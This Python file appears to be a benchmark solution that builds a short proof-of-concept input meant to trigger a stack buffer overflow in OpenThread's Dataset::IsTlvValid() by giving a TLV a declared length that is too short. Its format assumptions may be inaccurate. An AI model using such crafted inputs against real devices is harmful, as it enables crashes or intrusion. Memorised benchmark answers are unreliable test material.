import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a PoC that triggers stack buffer overflow in Dataset::IsTlvValid()
        # We'll create a TLV with invalid length that causes buffer overflow
        
        # Structure based on typical OpenThread dataset format:
        # 1. Dataset TLV header (Type + Length)
        # 2. Invalid Active/Pending Timestamp or Delay Timer TLV with insufficient length
        
        # Ground truth length is 262 bytes, but we aim for shorter
        # Create minimal PoC with just enough to trigger overflow
        
        poc = bytearray()
        
        # Dataset TLV Type (Active Dataset = 0x0003)
        poc.extend(struct.pack('<H', 0x0003))
        
        # Length - make it just enough to include our vulnerable TLV
        # We'll use Active Timestamp TLV (Type 0x0007) with insufficient length
        poc.extend(struct.pack('<H', 8))  # Just enough for type + length + minimal data
        
        # Add Active Timestamp TLV (Type 0x0007)
        poc.extend(struct.pack('<H', 0x0007))  # Active Timestamp TLV type
        poc.extend(struct.pack('<H', 0x0001))  # Invalid length - less than required (should be 8)
        poc.append(0xAA)  # Single byte of data when more is expected
        
        # The total length is 2 + 2 + 2 + 2 + 1 = 9 bytes
        # This is much shorter than ground truth but should still trigger
        # the vulnerability when IsTlvValid() tries to read more data than available
        
        return bytes(poc)